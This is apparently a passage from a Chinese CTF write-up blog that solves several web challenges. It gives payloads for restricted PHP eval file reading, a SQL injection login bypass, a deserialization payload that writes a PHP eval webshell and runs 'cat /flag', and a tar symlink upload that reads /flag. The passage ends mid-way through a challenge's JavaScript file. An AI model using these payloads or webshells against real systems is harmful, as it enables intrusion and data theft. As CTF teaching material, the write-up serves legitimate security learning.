<h1 id="4-ezrce"><a href="#4-ezrce" class="headerlink" title="4. ezrce"></a>4. ezrce</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[A-Za-z\(\)_;]+$/&#x27;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;师傅，你想拿flag？&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>正则 <code>/^[A-Za-z\(\)_;]+$/</code> 过滤了参数输入，只能使用大小写字母、小括号 <code>()</code>、分号 <code>;</code> 和下划线 <code>_</code></p>
<p>先测试payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=var_dump(scandir(getcwd()));</span><br></pre></td></tr></table></figure>

<p>回显：</p>
<p>array(3) { [0]&#x3D;&gt; string(1) “.” [1]&#x3D;&gt; string(2) “..” [2]&#x3D;&gt; string(9) “index.php” }</p>
<p>说明flag不在当前目录，尝试打印根目录的文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(scandir(dirname(dirname(dirname(getcwd())))));</span><br></pre></td></tr></table></figure>

<p>回显：</p>
<p>array(21) { [0]&#x3D;&gt; string(1) “.” [1]&#x3D;&gt; string(2) “..” [2]&#x3D;&gt; string(10) “.dockerenv” [3]&#x3D;&gt; string(3) “bin” [4]&#x3D;&gt; string(3) “dev” [5]&#x3D;&gt; string(3) “etc” [6]&#x3D;&gt; string(4) “flag” [7]&#x3D;&gt; string(4) “home” [8]&#x3D;&gt; string(3) “lib” [9]&#x3D;&gt; string(5) “media” [10]&#x3D;&gt; string(3) “mnt” [11]&#x3D;&gt; string(3) “opt” [12]&#x3D;&gt; string(4) “proc” [13]&#x3D;&gt; string(4) “root” [14]&#x3D;&gt; string(3) “run” [15]&#x3D;&gt; string(4) “sbin” [16]&#x3D;&gt; string(3) “srv” [17]&#x3D;&gt; string(3) “sys” [18]&#x3D;&gt; string(3) “tmp” [19]&#x3D;&gt; string(3) “usr” [20]&#x3D;&gt; string(3) “var” }</p>
<p>发现flag文件，读取文件内容（没出来就多刷新几次）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chdir(dirname(dirname(dirname(getcwd()))));show_source(array_rand(array_flip(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="5-flag到底在哪"><a href="#5-flag到底在哪" class="headerlink" title="5. flag到底在哪"></a>5. flag到底在哪</h1><p>链接进去后什么都没有，扫目录扫出&#x2F;robots.txt和&#x2F;admin&#x2F;login.php</p>
<p>访问&#x2F;admin&#x2F;login.php出现登录框</p>
<p>根据提示 username输入admin，密码则尝试万能密码，再根据题目提示要使用大写，使用万能密码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; OR &#x27;1&#x27;=&#x27;1&#x27; #</span><br></pre></td></tr></table></figure>

<p>进去后的页面直接说明<strong>上传 PHP Webshell</strong>，那就上传一句话木马，用蚁剑连接后使用插件查看phpinfo找到flag</p>
<hr>
<h1 id="6-来签个到吧"><a href="#6-来签个到吧" class="headerlink" title="6. 来签个到吧"></a>6. 来签个到吧</h1><p>看附件，先看index.php：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;./classes.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] === <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&quot;shark&quot;</span>] ?? <span class="string">&#x27;喵喵喵?&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">str_starts_with</span>(<span class="variable">$s</span>, <span class="string">&quot;blueshark:&quot;</span>)) &#123;</span><br><span class="line">        <span class="variable">$ss</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$s</span>, <span class="title function_ invoke__">strlen</span>(<span class="string">&quot;blueshark:&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$o</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ss</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$p</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO notes (content) VALUES (?)&quot;</span>);</span><br><span class="line">        <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$ss</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;save sucess!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;喵喵喵?&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$q</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT id, content FROM notes ORDER BY id DESC LIMIT 10&quot;</span>);</span><br><span class="line"><span class="variable">$rows</span> = <span class="variable">$q</span>-&gt;<span class="title function_ invoke__">fetchAll</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以知道：</p>
<ol>
<li><p>POST传入shark参数</p>
</li>
<li><p>会检验前缀是否是blueshark:</p>
</li>
<li><p>@unserialize($ss)会触发反序列化，同时@抑制报错</p>
</li>
<li><p>使用了 <strong>PDO 预处理</strong>，杜绝了 SQL 注入漏洞</p>
</li>
</ol>
<p>再看classes.php：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileLogger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logfile</span> = <span class="string">&quot;/tmp/notehub.log&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>=<span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$f</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logfile = <span class="variable">$f</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$msg</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content .= <span class="variable">$msg</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;logfile, <span class="variable">$this</span>-&gt;content, FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;content) &#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;logfile, <span class="variable">$this</span>-&gt;content, FILE_APPEND);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ShitMountant</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logger</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;url = <span class="variable">$url</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger = <span class="keyword">new</span> <span class="title class_">FileLogger</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;url);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;logger) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;fetched ==&gt; &quot;</span> . <span class="variable">$this</span>-&gt;url);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>抓住<strong>关键函数file_put_contents</strong>，这里就是传入shell并读取flag的关键</p>
<p>再看config.php：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_FILE&#x27;</span>, <span class="string">&#x27;/tmp/notehub.db&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(DB_FILE)) &#123;</span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;sqlite:&#x27;</span> . DB_FILE);</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="string">&quot;CREATE TABLE notes (id INTEGER PRIMARY KEY AUTOINCREMENT, content TEXT)&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;sqlite:&#x27;</span> . DB_FILE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只是说明连接到或者自动初始化一个 SQLite 数据库，没有什么太大作用</p>
<p>最后看api.php：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;./classes.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>] ?? <span class="string">&#x27;喵喵喵?&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT content FROM notes WHERE id = ?&quot;</span>);</span><br><span class="line"><span class="variable">$s</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$id</span>]);</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$s</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (! <span class="variable">$row</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;喵喵喵?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cfg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$row</span>[<span class="string">&quot;content&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$cfg</span> <span class="keyword">instanceof</span> ShitMountant) &#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$cfg</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ok!&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">nl2br</span>(<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$r</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;喵喵喵?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以知道：</p>
<ol>
<li><p>传入GET参数id</p>
</li>
<li><p>使用了 <strong>PDO 预处理</strong>，杜绝了 SQL 注入漏洞</p>
</li>
<li><p>存在 echo nl2br(htmlspecialchars($r));可以打印出回显内容，但采用写入shell不需要用到</p>
</li>
</ol>
<p>攻击顺序差不多捋清了：</p>
<ol>
<li><p>首先利用classes.php中的类编写脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileLogger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logfile</span> = <span class="string">&quot;shell.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&quot;&lt;?php @eval(\$_POST[&#x27;cmd&#x27;]);?&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">FileLogger</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>（<strong>注意：</strong> 因为用了双引号 <code>&quot;&quot;</code>，PHP 会认为 <code>$_POST</code> 是当前脚本的一个变量，会尝试<strong>立刻解析它</strong>，因为当前脚本里并没有传参，<code>$_POST[&#39;cmd&#39;]</code> 是空的，最终生成的字符串变成了：<code>&lt;?php @eval();?&gt;</code> ，所以<strong>需要\进行转义</strong>！）</p>
<p>生成payload：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">O:10:&quot;FileLogger&quot;:2:&#123;s:7:&quot;logfile&quot;;s:9:&quot;shell.php&quot;;s:7:&quot;content&quot;;s:29:&quot;&lt;?php @eval($<span class="emphasis">_POST[&#x27;cmd&#x27;]);?&gt;&quot;;&#125;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>根据index.php的源码，修改payload并在http:&#x2F;&#x2F;目标IP:端口&#x2F;index.php页面传入POST数据：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shark=blueshark:O:10:&quot;FileLogger&quot;:2:&#123;s:7:&quot;logfile&quot;;s:9:&quot;shell.php&quot;;s:7:&quot;content&quot;;s:29:&quot;&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>连接shell，访问http:&#x2F;&#x2F;目标IP:端口&#x2F;shell.php，若页面空白则表示成功，在post中传入：cmd&#x3D;system(‘cat &#x2F;flag’);拿到flag</p>
</li>
</ol>
<hr>
<h1 id="7-flag？我就借走了"><a href="#7-flag？我就借走了" class="headerlink" title="7. flag？我就借走了"></a>7. flag？我就借走了</h1><p><strong>“支持上传打包格式，上传后会自动帮你解压到目录”</strong> 且后端是 <strong>Python + Flask</strong></p>
<p>尝试软链接读取flag</p>
<p>首先在本地创建一个指向 <code>/flag</code> 的快捷方式，再用 <code>tar</code> 命令把它打包，服务器解压后，会在上传目录下生成一个指向服务器根目录下 <code>/flag</code> 的快捷方式。</p>
<p>比如在kali终端执行：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> -s /flag flag.txt</span><br><span class="line">tar -cf flag.tar flag.txt</span><br></pre></td></tr></table></figure>

<p>上传后点击flag.txt的快捷方式即可</p>
<hr>
<h1 id="8-Who-am-I"><a href="#8-Who-am-I" class="headerlink" title="8. Who am I"></a>8. Who am I</h1><p>随便注册个账号，在登录时抓包发现在POST多了一个type&#x3D;1</p>
<p>改成type&#x3D;0后是一个302页面，可以跳转去&#x2F;272e1739b89da32e983970ece1a086bd</p>
<p><img src="/img/isctf/0e4abe91-4a22-4583-b410-e38be13c473a.png" alt="p1"></p>
<p>访问发现可以查看配置文件</p>
<p>sontriex.a47b9c5f.js：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&quot;/user/demo&quot;</span>,&#123;<span class="attr">method</span>:<span class="string">&quot;POST&quot;</span>&#125;)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">r</span> =&gt;</span> r.<span class="title function_">json</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;username&quot;</span>).<span class="property">innerText</span> = data.<span class="property">username</span>;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<p>malniest.e19a0e13.js：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="string">&quot;use strict&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">noop</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">identity</span>(<span class="params">x</span>) &#123; <span class="keyword">return</span> x; &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">times</span>(<span class="params">n, fn</span>) &#123; <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; n; i++) <span class="title function_">fn</span>(i); &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">clamp</span>(<span class="params">v, a, b</span>) &#123; <span class="keyword">return</span> <span class="title class_">Math</span>.<span class="title function_">min</span>(b, <span class="title class_">Math</span>.<span class="title function_">max</span>(a, v)); &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">hashStr</span>(<span class="params">s</span>) &#123; <span class="keyword">let</span> h = <span class="number">0</span>; <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; s.<span class="property">length</span>; i++) h = (h &lt;&lt; <span class="number">5</span>) - h + s.<span class="title function_">charCodeAt</span>(i) | <span class="number">0</span>; <span class="keyword">return</span> h &gt;&gt;&gt; <span class="number">0</span>; &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">randInt</span>(<span class="params">a, b</span>) &#123; <span class="keyword">return</span> a + <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * (b - a + <span class="number">1</span>)); &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">pad2</span>(<span class="params">n</span>) &#123; <span class="keyword">return</span> n &lt; <span class="number">10</span> ? <span class="string">&quot;0&quot;</span> + n : <span class="string">&quot;&quot;</span> + n; &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">dateStamp</span>(<span class="params"></span>) &#123; <span class="keyword">const</span> d = <span class="keyword">new</span> <span class="title class_">Date</span>(); <span class="keyword">return</span> d.<span class="title function_">getFullYear</span>()+<span class="string">&quot;-&quot;</span>+<span class="title function_">pad2</span>(d.<span class="title function_">getMonth</span>()+<span class="number">1</span>)+<span class="string">&quot;-&quot;</span>+<span class="title function_">pad2</span>(d.<span class="title function_">getDate</span>()); &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">debounce</span>(<span class="params">fn, wait</span>) &#123; <span class="keyword">let</span> t; <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123; <span class="built_in">clearTimeout</span>(t); t = <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>), wait); &#125;; &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">throttle</span>(<span class="params">fn, wait</span>) &#123; <span class="keyword">let</span> last = <span class="number">0</span>; <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123; <span class="keyword">const</span> now = <span class="title class_">Date</span>.<span class="title function_">now</span>(); <span class="keyword">if</span> (now - last &gt;= wait) &#123; last = now; fn.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>); &#125; &#125;; &#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">memo</span>(<span class="params">fn</span>) &#123; <span class="keyword">const</span> m = <span class="keyword">new</span> <span class="title class_">Map</span>(); <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">k</span>) &#123; <span class="keyword">if</span> (m.<span class="title function_">has</span>(k)) <span class="keyword">return</span> m.<span class="title function_">get</span>(k); <span class="keyword">const</span> v = <span class="title function_">fn</span>(k); m.<span class="title function_">set</span>(k, v); <span class="keyword">return</span> v; &#125;; &#125;</span><br><span class="line">  <span class="keyword">const</span> expensive = <span class="title function_">memo</span>(<span class="function"><span class="params">n</span> =&gt;</span> &#123; <span class="keyword">let</span> r = <span class="number">1</span>; <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; <span class="number">1000</span>; i++) r = (r * (n + i)) % <span class="number">2147483647</span>; <span class="keyword">return</span> r; &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">camel</span>(<span class="params">s</span>)&#123;<span class="keyword">return</span> s.<span class="title function_">replace</span>(<span class="regexp">/[-_](\w)/g</span>,<span class="function">(<span class="params">_,c</span>)=&gt;</span>c.<span class="title function_">toUpperCase</span>());&#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">chunk</span>(<span class="params">arr, size</span>)&#123;<span class="keyword">const</span> out=[];<span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;ia.<span class="title function_">concat</span>(b),[]);&#125;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">repeatStr</span>(<span class="params">s,n</span>)&#123;<span class="keyword">let</span> r=<span class="string">&quot;&quot;</span>;<span class="title function_">times</span>(n,<span class="function">()=&gt;</span>r+=s);<span class="keyword">return</span> r;&#125;</span><br><span class="line">  <span class="keyword">const</span> loremPool = <span class="string">&quot;lorem ipsum dolor sit amet consectetur adipiscing elit&quot;</span>.<span class="title function_">split</span>(<span class="string">&quot; &quot;</span>);</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">lorem</span>(<span class="params">n</span>)&#123;<span class="keyword">let</span> r=[];<span class="title function_">times</span>(n,<span class="function">()=&gt;</span>r.<span class="title function_">push</span>(loremPool[<span class="title function_">randInt</span>(<span class="number">0</span>,loremPool.<span class="property">length</span>-<span class="number">1</span>)]));<span class="keyword">return</span> r.<span class="title function_">join</span>(<span class="string">&quot; &quot;</span>);&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">Net</span> = &#123;</span><br><span class="line">    <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params">url</span>)&#123; <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(&#123;url, <span class="attr">ok</span>: <span class="literal">true</span>, <span class="attr">ts</span>: <span class="title class_">Date</span>.<span class="title function_">now</span>()&#125;); &#125;,</span><br><span class="line">    <span class="attr">post</span>: <span class="keyword">function</span>(<span class="params">url, body</span>)&#123; <span class="keyword">return</span> <span class="title class_">Promise</span>.<span class="title function_">resolve</span>(&#123;url, <span class="attr">ok</span>: <span class="literal">true</span>, <span class="attr">len</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(body||&#123;&#125;).<span class="property">length</span>&#125;); &#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">Bus</span> = (<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">      <span class="attr">on</span>: <span class="function">(<span class="params">e,fn</span>)=&gt;</span>&#123; <span class="keyword">if</span>(!map.<span class="title function_">has</span>()) map.<span class="title function_">set</span>(e, []); map.<span class="title function_">get</span>(e).<span class="title function_">push</span>(fn); &#125;,</span><br><span class="line">      <span class="attr">emit</span>: <span class="function">(<span class="params">e,p</span>)=&gt;</span>&#123; <span class="keyword">const</span> arr = map.<span class="title function_">get</span>(e)||[]; arr.<span class="title function_">forEach</span>(<span class="function"><span class="params">fn</span>=&gt;</span>&#123; <span class="keyword">try</span>&#123;<span class="title function_">fn</span>(p);&#125;<span class="keyword">catch</span>(_)&#123;&#125; &#125;); &#125;,</span><br><span class="line">      <span class="attr">off</span>: <span class="function">(<span class="params">e,fn</span>)=&gt;</span>&#123; <span class="keyword">const</span> arr = map.<span class="title function_">get</span>(e)||[]; map.<span class="title function_">set</span>(e, arr.<span class="title function_">filter</span>(<span class="function"><span class="params">f</span>=&gt;</span>f!==fn)); &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;)();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">DOM</span> = &#123;</span><br><span class="line">    <span class="attr">qs</span>: <span class="function">(<span class="params">sel, root=<span class="variable language_">document</span></span>)=&gt;</span>root.<span class="title function_">querySelector</span>(sel),</span><br><span class="line">    <span class="attr">qsa</span>: <span class="function">(<span class="params">sel, root=<span class="variable language_">document</span></span>)=&gt;</span><span class="title class_">Array</span>.<span class="title function_">from</span>(root.<span class="title function_">querySelectorAll</span>(sel)),</span><br><span class="line">    <span class="attr">el</span>: <span class="function">(<span class="params">tag, props</span>)=&gt;</span><span class="title class_">Object</span>.<span class="title function_">assign</span>(<span class="variable language_">document</span>.<span class="title function_">createElement</span>(tag), props||&#123;&#125;),</span><br><span class="line">    <span class="attr">hide</span>: <span class="function">(<span class="params">node</span>)=&gt;</span>&#123; <span class="keyword">if</span>(node &amp;&amp; node.<span class="property">style</span>) node.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;none&quot;</span>; &#125;,</span><br><span class="line">    <span class="attr">show</span>: <span class="function">(<span class="params">node</span>)=&gt;</span>&#123; <span class="keyword">if</span>(node &amp;&amp; node.<span class="property">style</span>) node.<span class="property">style</span>.<span class="property">display</span> = <span class="string">&quot;&quot;</span>; &#125;,</span><br><span class="line">    <span class="attr">on</span>: <span class="function">(<span class="params">node, ev, fn, opt</span>)=&gt;</span>node &amp;&amp; node.<span class="title function_">addEventListener</span>(ev, fn, opt)</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">fakeLayoutScore</span>(<span class="params">node</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!node) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> r = node.<span class="property">getBoundingClientRect</span> ? node.<span class="title function_">getBoundingClientRect</span>() : &#123;<span class="attr">width</span>:<span class="number">1</span>,<span class="attr">height</span>:<span class="number">1</span>&#125;;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">clamp</span>(<span class="title class_">Math</span>.<span class="title function_">floor</span>((r.<span class="property">width</span> * r.<span class="property">height</span>) % <span class="number">9973</span>), <span class="number">0</span>, <span class="number">9973</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="variable constant_">CFG</span> = &#123;</span><br><span class="line">    <span class="attr">version</span>: <span class="string">&quot;v&quot;</span>+<span class="title function_">dateStamp</span>()+<span class="string">&quot;.&quot;</span>+<span class="title function_">randInt</span>(<span class="number">100</span>,<span class="number">999</span>),</span><br><span class="line">    <span class="attr">flags</span>: &#123; <span class="attr">featureX</span>: <span class="literal">false</span>, <span class="attr">featureY</span>: <span class="literal">true</span>, <span class="attr">verbose</span>: <span class="literal">false</span> &#125;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">const</span> <span class="title class_">Cache</span> = <span 